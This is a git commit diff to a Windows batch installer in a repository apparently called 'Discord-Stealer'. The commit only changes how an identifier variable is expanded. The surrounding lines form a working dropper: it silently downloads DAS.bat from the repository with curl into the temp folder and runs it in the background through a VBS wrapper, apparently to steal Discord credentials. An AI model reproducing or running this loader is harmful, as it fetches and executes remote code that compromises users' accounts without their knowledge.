2b69c049ceba5eff82f67210fe55eec2bad13ea4
agamsol <43265196+agamsol@users.noreply.github.com>
2021-09-29 19:48:35 +0300

    Update Installer.bat

--- 2.0/Installer.bat
+++ 2.0/Installer.bat
@@ -3,5 +3,5 @@ set Identifier=%~1
 set "Save=%temp%\"
 curl --create-dirs -sf#kLo "%Save%DAS.bat" "https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/2.0/DAS.bat"
 call "%Save%DAS.bat" --Background
-call "%Save%background.vbs" "%Save%DAS.bat" "!Identifier!"
+call "%Save%background.vbs" "%Save%DAS.bat" "%Identifier%"
 exit /b
